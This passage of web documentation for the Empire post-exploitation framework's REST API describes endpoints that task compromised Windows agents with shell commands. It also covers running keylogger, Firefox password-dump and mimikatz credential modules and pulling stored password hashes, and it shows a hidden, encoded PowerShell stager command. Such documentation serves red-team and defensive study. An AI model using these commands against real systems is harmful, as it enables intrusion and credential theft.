      &quot;Value&quot;: &quot;&quot;
    },
    &quot;Output&quot;: &quot;powershell.exe -NoP -sta -NonI -W Hidden -Enc JAB...KQA=&quot;,
    &quot;Proxy&quot;: {
      &quot;Description&quot;: &quot;Proxy to use for request (default, none, or other).&quot;,
      &quot;Required&quot;: false,
      &quot;Value&quot;: &quot;default&quot;
    },
    &quot;ProxyCreds&quot;: {
      &quot;Description&quot;: &quot;Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).&quot;,
      &quot;Required&quot;: false,
      &quot;Value&quot;: &quot;default&quot;
    },
    &quot;StagerRetries&quot;: {
      &quot;Description&quot;: &quot;Times for the stager to retry connecting.&quot;,
      &quot;Required&quot;: false,
      &quot;Value&quot;: &quot;0&quot;
    },
    &quot;UserAgent&quot;: {
      &quot;Description&quot;: &quot;User-agent string to use for the staging request (default, none, or other).&quot;,
      &quot;Required&quot;: false,
      &quot;Value&quot;: &quot;default&quot;
    }
  }
}
</code></pre>

<h2 id="agents">Agents</h2>

<ul>
<li><a href="#get-current-agents">Get Current Agents</a></li>
<li><a href="#get-stale-agents">Get Stale Agents</a></li>
<li><a href="#remove-stale-agents">Remove Stale Agents</a></li>
<li><a href="#remove-agent">Remove Agent</a></li>
<li><a href="#task-an-agent-to-run-a-shell-command">Task an Agent to run a Shell Command</a></li>
<li><a href="#task-all-agents-to-run-a-shell-command">Task all Agents to run a Shell Command</a></li>
<li><a href="#get-agent-results">Get Agent Results</a></li>
<li><a href="#delete-agent-results">Delete Agent Results</a></li>
<li><a href="#delete-all-agent-results">Delete All Agent Results</a></li>
<li><a href="#clear-queued-agent-tasking">Clear Queued Agent Tasking</a></li>
<li><a href="#rename-an-agent">Rename an Agent</a></li>
<li><a href="#kill-an-agent">Kill an Agent</a></li>
<li><a href="#kill-all-agents">Kill all Agents</a></li>
</ul>

<h3 id="get-current-agents">Get Current Agents</h3>

<h4 id="handler-15">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/agents</li>
<li>Description : Returns all current Empire agents.</li>
<li>No parameters</li>
</ul>

<h4 id="example-15">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/agents?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;agents&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;checkin_time&quot;: &quot;2016-03-31 17:36:34&quot;,
      &quot;children&quot;: null,
      &quot;delay&quot;: 5,
      &quot;external_ip&quot;: &quot;192.168.52.200&quot;,
      &quot;functions&quot;: null,
      &quot;headers&quot;: &quot;&quot;,
      &quot;high_integrity&quot;: 0,
      &quot;hostname&quot;: &quot;WINDOWS1&quot;,
      &quot;internal_ip&quot;: &quot;192.168.52.200&quot;,
      &quot;jitter&quot;: 0.0,
      &quot;kill_date&quot;: &quot;&quot;,
      &quot;lastseen_time&quot;: &quot;2016-03-31 17:38:55&quot;,
      &quot;listener&quot;: &quot;http://192.168.52.172:8080/&quot;,
      &quot;lost_limit&quot;: 60,
      &quot;name&quot;: &quot;3GHZPWEGADMT2KPA&quot;,
      &quot;old_uris&quot;: null,
      &quot;os_details&quot;: &quot;Microsoft Windows 7 Professional &quot;,
      &quot;parent&quot;: null,
      &quot;process_id&quot;: &quot;1636&quot;,
      &quot;process_name&quot;: &quot;powershell&quot;,
      &quot;ps_version&quot;: &quot;2&quot;,
      &quot;results&quot;: &quot;&quot;,
      &quot;servers&quot;: null,
      &quot;sessionID&quot;: &quot;3GHZPWEGADMT2KPA&quot;,
      &quot;session_key&quot;: &quot;7.+...&quot;,
      &quot;taskings&quot;: &quot;&quot;,
      &quot;uris&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp&quot;,
      &quot;user_agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;,
      &quot;username&quot;: &quot;WINDOWS1\\user&quot;,
      &quot;working_hours&quot;: &quot;&quot;
    },
    ...
  ]
}
</code></pre>

<h3 id="get-stale-agents">Get Stale Agents</h3>

<h4 id="handler-16">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/agents/stale</li>
<li>Description : Returns all &lsquo;stale&rsquo; Empire agents (past checkin window).</li>
<li>No parameters</li>
</ul>

<h4 id="example-16">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/agents/stale?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;agents&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;checkin_time&quot;: &quot;2016-03-31 17:36:34&quot;,
      &quot;children&quot;: null,
      &quot;delay&quot;: 5,
      &quot;external_ip&quot;: &quot;192.168.52.200&quot;,
      &quot;functions&quot;: null,
      &quot;headers&quot;: &quot;&quot;,
      &quot;high_integrity&quot;: 0,
      &quot;hostname&quot;: &quot;WINDOWS1&quot;,
      &quot;internal_ip&quot;: &quot;192.168.52.200&quot;,
      &quot;jitter&quot;: 0.0,
      &quot;kill_date&quot;: &quot;&quot;,
      &quot;lastseen_time&quot;: &quot;2016-03-31 17:38:55&quot;,
      &quot;listener&quot;: &quot;http://192.168.52.172:8080/&quot;,
      &quot;lost_limit&quot;: 60,
      &quot;name&quot;: &quot;3GHZPWEGADMT2KPA&quot;,
      &quot;old_uris&quot;: null,
      &quot;os_details&quot;: &quot;Microsoft Windows 7 Professional &quot;,
      &quot;parent&quot;: null,
      &quot;process_id&quot;: &quot;1636&quot;,
      &quot;process_name&quot;: &quot;powershell&quot;,
      &quot;ps_version&quot;: &quot;2&quot;,
      &quot;results&quot;: &quot;&quot;,
      &quot;servers&quot;: null,
      &quot;sessionID&quot;: &quot;3GHZPWEGADMT2KPA&quot;,
      &quot;session_key&quot;: &quot;7.+...&quot;,
      &quot;taskings&quot;: &quot;&quot;,
      &quot;uris&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp&quot;,
      &quot;user_agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;,
      &quot;username&quot;: &quot;WINDOWS1\\user&quot;,
      &quot;working_hours&quot;: &quot;&quot;
    },
    ...
  ]
}
</code></pre>

<h3 id="remove-stale-agents">Remove Stale Agents</h3>

<h4 id="handler-17">Handler</h4>

<ul>
<li><strong>Handler</strong> : DELETE /api/agents/stale</li>
<li>Description : Removes all &lsquo;stale&rsquo; Empire agents (past checkin window).</li>
<li>No parameters</li>
</ul>

<h4 id="example-17">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/agents/stale?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X DELETE
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="get-agent-by-name">Get Agent by Name</h3>

<h4 id="handler-18">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/agents/AGENT_NAME</li>
<li>Description : Returns the agent specifed by AGENT_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-18">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/agents/XMY2H2ZPFWNPGEAP?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;agents&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;checkin_time&quot;: &quot;2016-03-31 20:29:31&quot;,
      &quot;children&quot;: null,
      &quot;delay&quot;: 5,
      &quot;external_ip&quot;: &quot;192.168.52.200&quot;,
      &quot;functions&quot;: null,
      &quot;headers&quot;: &quot;&quot;,
      &quot;high_integrity&quot;: 0,
      &quot;hostname&quot;: &quot;WINDOWS1&quot;,
      &quot;internal_ip&quot;: &quot;192.168.52.200&quot;,
      &quot;jitter&quot;: 0.0,
      &quot;kill_date&quot;: &quot;&quot;,
      &quot;lastseen_time&quot;: &quot;2016-03-31 20:29:38&quot;,
      &quot;listener&quot;: &quot;http://192.168.52.173:8080/&quot;,
      &quot;lost_limit&quot;: 60,
      &quot;name&quot;: &quot;XMY2H2ZPFWNPGEAP&quot;,
      &quot;old_uris&quot;: null,
      &quot;os_details&quot;: &quot;Microsoft Windows 7 Professional &quot;,
      &quot;parent&quot;: null,
      &quot;process_id&quot;: &quot;2600&quot;,
      &quot;process_name&quot;: &quot;powershell&quot;,
      &quot;ps_version&quot;: &quot;2&quot;,
      &quot;results&quot;: null,
      &quot;servers&quot;: null,
      &quot;sessionID&quot;: &quot;XMY2H2ZPFWNPGEAP&quot;,
      &quot;session_key&quot;: &quot;+e`x!...&quot;,
      &quot;taskings&quot;: null,
      &quot;uris&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp&quot;,
      &quot;user_agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;,
      &quot;username&quot;: &quot;WINDOWS1\\user&quot;,
      &quot;working_hours&quot;: &quot;&quot;
    }
  ]
}
</code></pre>

<h3 id="remove-agent">Remove Agent</h3>

<h4 id="handler-19">Handler</h4>

<ul>
<li><strong>Handler</strong> : DELETE /api/agents/AGENT_NAME</li>
<li>Description : Removes the agent specifed by AGENT_NAME (doesn&rsquo;t kill first).</li>
<li>No parameters</li>
</ul>

<h4 id="example-19">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/agents/XMY2H2ZPFWNPGEAP?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X DELETE
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="task-an-agent-to-run-a-shell-command">Task an Agent to run a Shell Command</h3>

<h4 id="handler-20">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST /api/agents/AGENT_NAME/shell</li>
<li>Description : Tasks the agent specifed by AGENT_NAME to run the given shell command.</li>
<li>Parameters :

<ul>
<li>command  : the shell command to task the agent to run (required)</li>
</ul></li>
</ul>

<h4 id="example-20">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/CXPLDTZCKFNT3SLT/shell?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{&quot;command&quot;:&quot;whoami&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="task-all-agents-to-run-a-shell-command">Task all Agents to run a Shell Command</h3>

<h4 id="handler-21">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST /api/agents/all/shell</li>
<li>Description : Tasks all agents to run the given shell command.</li>
<li>Parameters :

<ul>
<li>command  : the shell command to task the agents to run (required)</li>
</ul></li>
</ul>

<h4 id="example-21">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/all/shell?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{&quot;command&quot;:&quot;pwd&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="get-agent-results">Get Agent Results</h3>

<h4 id="handler-22">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/agents/AGENT_NAME/results</li>
<li>Description : Retrieves results for the agent specifed by AGENT_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-22">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/CXPLDTZCKFNT3SLT/results?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;results&quot;: [
    {
      &quot;agentname&quot;: &quot;CXPLDTZCKFNT3SLT&quot;,
      &quot;results&quot;: &quot;WINDOWS1\\user\nPath                                                                           \r\n----                                                                           \r\nC:\\Users\\user
    }
  ]
}r
</code></pre>

<h3 id="delete-agent-results">Delete Agent Results</h3>

<h4 id="handler-23">Handler</h4>

<ul>
<li><strong>Handler</strong> : DELETE /api/agents/AGENT_NAME/results</li>
<li>Description : Deletes the result buffer for the agent specifed by AGENT_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-23">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/CXPLDTZCKFNT3SLT/results?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X DELETE
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="delete-all-agent-results">Delete All Agent Results</h3>

<h4 id="handler-24">Handler</h4>

<ul>
<li><strong>Handler</strong> : DELETE /api/agents/all/results</li>
<li>Description : Deletes all agent result buffers</li>
<li>No parameters</li>
</ul>

<h4 id="example-24">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/all/results?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X DELETE
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="clear-queued-agent-tasking">Clear Queued Agent Tasking</h3>

<h4 id="handler-25">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST/GET /api/agents/AGENT_NAME/clear</li>
<li>Description : Clears the queued taskings for the agent specified by AGENT_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-25">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/CXPLDTZCKFNT3SLT/clear?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="rename-an-agent">Rename an Agent</h3>

<h4 id="handler-26">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST/GET /api/agents/AGENT_NAME/rename</li>
<li>Description : Renames the agent specified by AGENT_NAME.</li>
<li>Parameters :

<ul>
<li>newname  : the name to rename the specified agent to (required)</li>
</ul></li>
</ul>

<h4 id="example-26">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/CXPLDTZCKFNT3SLT/rename?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{&quot;newname&quot;:&quot;initial&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="kill-an-agent">Kill an Agent</h3>

<h4 id="handler-27">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST/GET /api/agents/AGENT_NAME/kill</li>
<li>Description : Tasks the agent specified by AGENT_NAME to exit.</li>
<li>No parameters</li>
</ul>

<h4 id="example-27">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/CXPLDTZCKFNT3SLT/kill?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="kill-all-agents">Kill all Agents</h3>

<h4 id="handler-28">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST/GET /api/agents/all/kill</li>
<li>Description : Tasks all agents to exit.</li>
<li>No parameters</li>
</ul>

<h4 id="example-28">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/agents/all/kill?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h2 id="modules">Modules</h2>

<ul>
<li><a href="#get-current-modules">Get Current Modules</a></li>
<li><a href="#get-module-by-name">Get Module by Name</a></li>
<li><a href="#search-for-module">Search for Module</a></li>
<li><a href="#execute-a-module">Execute a Module</a></li>
</ul>

<h3 id="get-current-modules">Get Current Modules</h3>

<h4 id="handler-29">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/modules</li>
<li>Description : Returns all current Empire modules.</li>
<li>No parameters</li>
</ul>

<h4 id="example-29">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/modules?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;modules&quot;: [
    {
      &quot;Author&quot;: [
        &quot;@xorrior&quot;
      ],
      &quot;Background&quot;: true,
      &quot;Comments&quot;: [
        &quot;https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-FoxDump.ps1&quot;,
        &quot;http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/&quot;
      ],
      &quot;Description&quot;: &quot;This module will dump any saved passwords from Firefox to the console. This should work for any versionof Firefox above version 32. This will only be successful if the master password is blank or has not been set.&quot;,
      &quot;MinPSVersion&quot;: &quot;2&quot;,
      &quot;Name&quot;: &quot;collection/FoxDump&quot;,
      &quot;NeedsAdmin&quot;: false,
      &quot;OpsecSafe&quot;: true,
      &quot;OutputExtension&quot;: null,
      &quot;SaveOutput&quot;: false,
      &quot;options&quot;: {
        &quot;Agent&quot;: {
          &quot;Description&quot;: &quot;Agent to run the module on.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;&quot;
        },
        &quot;OutFile&quot;: {
          &quot;Description&quot;: &quot;Path to Output File&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;&quot;
        }
      }
    },
    ...
  ]
}
</code></pre>

<h3 id="get-module-by-name">Get Module by Name</h3>

<h4 id="handler-30">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/modules/MODULE_NAME</li>
<li>Description : Returns the module specified by MODULE_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-30">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/modules/collection/keylogger?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;modules&quot;: [
    {
      &quot;Author&quot;: [
        &quot;@obscuresec&quot;,
        &quot;@mattifestation&quot;,
        &quot;@harmj0y&quot;
      ],
      &quot;Background&quot;: true,
      &quot;Comments&quot;: [
        &quot;https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1&quot;
      ],
      &quot;Description&quot;: &quot;Logs keys pressed, time and the active window (when changed).&quot;,
      &quot;MinPSVersion&quot;: &quot;2&quot;,
      &quot;Name&quot;: &quot;collection/keylogger&quot;,
      &quot;NeedsAdmin&quot;: false,
      &quot;OpsecSafe&quot;: true,
      &quot;OutputExtension&quot;: null,
      &quot;options&quot;: {
        &quot;Agent&quot;: {
          &quot;Description&quot;: &quot;Agent to run module on.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;&quot;
        }
      }
    }
  ]
}
</code></pre>

<h3 id="search-for-module">Search for Module</h3>

<h4 id="handler-31">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST /api/modules/search</li>
<li>Description : Searches all module fields for the given term.</li>
<li>Parameters (none required) :

<ul>
<li>term    : the term to search for (required)</li>
</ul></li>
</ul>

<h4 id="example-31">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot;  https://localhost:1337/api/modules/search?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -d '{&quot;term&quot;:&quot;keylogger&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;modules&quot;: [
    {
      &quot;Author&quot;: [
        &quot;@obscuresec&quot;,
        &quot;@mattifestation&quot;,
        &quot;@harmj0y&quot;
      ],
      &quot;Background&quot;: true,
      &quot;Comments&quot;: [
        &quot;https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1&quot;
      ],
      &quot;Description&quot;: &quot;Logs keys pressed, time and the active window (when changed).&quot;,
      &quot;MinPSVersion&quot;: &quot;2&quot;,
      &quot;Name&quot;: &quot;collection/keylogger&quot;,
      &quot;NeedsAdmin&quot;: false,
      &quot;OpsecSafe&quot;: true,
      &quot;OutputExtension&quot;: null,
      &quot;options&quot;: {
        &quot;Agent&quot;: {
          &quot;Description&quot;: &quot;Agent to run module on.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;&quot;
        }
      }
    }
  ]
}
</code></pre>

<h3 id="execute-a-module">Execute a Module</h3>

<h4 id="handler-32">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST /api/modules/MODULE_NAME</li>
<li>Description : Tasks an</li>
<li>Parameters (none required) :

<ul>
<li>Agent    : the agent to task the module for (or all). Required.</li>
<li><em>additional</em>    : any additional module values enumerated from module options</li>
</ul></li>
</ul>

<h4 id="example-32">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/modules/credentials/mimikatz/logonpasswords?token=$TOKEN -X POST -d '{&quot;Agent&quot;:&quot;WTN1LHHRYHFWHXU3&quot;}'

</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;msg&quot;: &quot;tasked agent WTN1LHHRYHFWHXU3 to run module credentials/mimikatz/logonpasswords&quot;,
  &quot;success&quot;: true
}
</code></pre>

<h2 id="credentials">Credentials</h2>

<h3 id="get-stored-credentials">Get Stored Credentials</h3>

<h4 id="handler-33">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/creds</li>
<li>Description : Returns all credentials currently stored in an Empire server.</li>
<li>No parameters</li>
</ul>

<h4 id="example-33">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/creds?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;creds&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;credtype&quot;: &quot;hash&quot;,
      &quot;domain&quot;: &quot;testlab.local&quot;,
      &quot;host&quot;: &quot;WINDOWS1&quot;,
      &quot;notes&quot;: &quot;2016-03-31 17:37:23&quot;,
      &quot;password&quot;: &quot;2b576acbe6b...&quot;,
      &quot;sid&quot;: &quot;S-1-5-21-664317401-282805101-...&quot;,
      &quot;username&quot;: &quot;Administrator&quot;
    },
    ...
  ]
}
</code></pre>

<h2 id="reporting">Reporting</h2>

<ul>
<li><a href="#get-all-logged-events">Get All Logged Events</a></li>
<li><a href="#get-agent-logged-events">Get Agent Logged Events</a></li>
<li><a href="#get-logged-events-of-specific-type">Get Logged Events of Specific Type</a></li>
<li><a href="#get-logged-events-w-specific-msg">Get Logged Events w/ Specific Msg</a></li>
</ul>

<h3 id="get-all-logged-events">Get All Logged Events</h3>

<h4 id="handler-34">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/reporting</li>
<li>Description : Returns all logged events.</li>
<li>No parameters</li>
</ul>

<h4 id="example-34">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/reporting?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;reporting&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;agentname&quot;: &quot;3GHZPWEGADMT2KPA&quot;,
      &quot;event_type&quot;: &quot;checkin&quot;,
      &quot;message&quot;: &quot;2016-03-31 17:36:34&quot;,
      &quot;timestamp&quot;: &quot;2016-03-31 17:36:34&quot;
    },
    ...
  ]
}
</code></pre>

<h3 id="get-agent-logged-events">Get Agent Logged Events</h3>

<h4 id="handler-35">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/reporting/agent/AGENT_NAME</li>
<li>Description : Returns the events for a specified AGENT_NAME</li>
<li>No parameters</li>
</ul>

<h4 id="example-35">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/reporting/agent/initial?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;reporting&quot;: [
    {
      &quot;ID&quot;: 28,
      &quot;agentname&quot;: &quot;SMLHRBLTP4Z14SHC&quot;,
      &quot;event_type&quot;: &quot;checkin&quot;,
      &quot;message&quot;: &quot;2016-03-31 21:01:34&quot;,
      &quot;timestamp&quot;: &quot;2016-03-31 21:01:34&quot;
    },
    ...
  ]
}
</code></pre>

<h3 id="get-logged-events-of-specific-type">Get Logged Events of Specific Type</h3>

<h4 id="handler-36">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/reporting/type/MSG_TYPE</li>
<li>Description : Returns the events of a specified MSG_TYPE (checkin, task, result).</li>
<li>No parameters</li>
</ul>

<h4 id="example-36">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/reporting/type/checkin?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;reporting&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;agentname&quot;: &quot;3GHZPWEGADMT2KPA&quot;,
      &quot;event_type&quot;: &quot;checkin&quot;,
      &quot;message&quot;: &quot;2016-03-31 17:36:34&quot;,
      &quot;timestamp&quot;: &quot;2016-03-31 17:36:34&quot;
    },
    {
      &quot;ID&quot;: 4,
      &quot;agentname&quot;: &quot;PK4HAFLH4231E14X&quot;,
      &quot;event_type&quot;: &quot;checkin&quot;,
      &quot;message&quot;: &quot;2016-03-31 17:36:50&quot;,
      &quot;timestamp&quot;: &quot;2016-03-31 17:36:50&quot;
    },
    ...
  ]
}
</code></pre>

<h3 id="get-logged-events-w-specific-msg">Get Logged Events w/ Specific Msg</h3>

<h4 id="handler-37">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/reporting/msg/MSG</li>
<li>Description : Returns the events matching a specific MSG.</li>
<li>No parameters</li>
</ul>

<h4 id="example-37">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/reporting/msg/mimikatz?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;reporting&quot;: [
    {
      &quot;ID&quot;: 5,
      &quot;agentname&quot;: &quot;PK4HAFLH4231E14X&quot;,
      &quot;event_type&quot;: &quot;task&quot;,
      &quot;message&quot;: &quot;TASK_CMD_JOB - function Invoke-Mimikatz\n{\n[CmdletBinding(DefaultP&quot;,
      &quot;timestamp&quot;: &quot;2016-03-31 17:36:54&quot;
    },
    ...
  ]
}
</code></pre>


			<aside class="copyright" role="note">
				
				&copy; 2017 Released under BSD 3-clause New/Revised License &ndash;
				
				Documentation built with
				<a href="https://www.gohugo.io" target="_blank">Hugo</a>
				using the
				<a href="http://github.com/digitalcraftsman/hugo-material-docs" target="_blank">Material</a> theme.
			</aside>

			<footer class="footer">
				

<nav class="pagination" aria-label="Footer">
  <div class="previous">
  
      <a href="https://example.org/powershell-modules/" title="OSX Module Docs">
        <span class="direction">
          Previous
        </span>
        <div class="page">
          <div class="button button-previous" role="button" aria-label="Previous">
            <i class="icon icon-back"></i>
          </div>
          <div class="stretch">
            <div class="title">
              OSX Module Docs
            </div>
          </div>
        </div>
      </a>
  
  </div>

  <div class="next">
  
      <a href="https://example.org/roadmap/" title="Roadmap">
        <span class="direction">
          Next
        </span>
        <div class="page">
          <div class="stretch">
            <div class="title">
              Roadmap
            </div>
          </div>
          <div class="button button-next" role="button" aria-label="Next">
            <i class="icon icon-forward"></i>
          </div>
        </div>
      </a>
  
  </div>
</nav>





			</footer>
		</div>
	</article>

	<div class="results" role="status" aria-live="polite">
		<div class="scrollable">
			<div class="wrapper">
				<div class="meta"></div>
				<div class="list"></div>
			</div>
		</div>
	</div>
</main>

    <script>
    
      var base_url = 'https:\/\/example.org\/';
      var repo_id  = 'EmpireProject\/Empire';
    
    </script>

    <script src="https://example.org/javascripts/application.js"></script>
    

    <script>
      /* Add headers to scrollspy */
      var headers   = document.getElementsByTagName("h2");
      var scrollspy = document.getElementById('scrollspy');

      if(scrollspy) {
        if(headers.length > 0) {
          for(var i = 0; i < headers.length; i++) {
            var li = document.createElement("li");
            li.setAttribute("class", "anchor");

            var a  = document.createElement("a");
            a.setAttribute("href", "#" + headers[i].id);
            a.setAttribute("title", headers[i].innerHTML);
            a.innerHTML = headers[i].innerHTML;

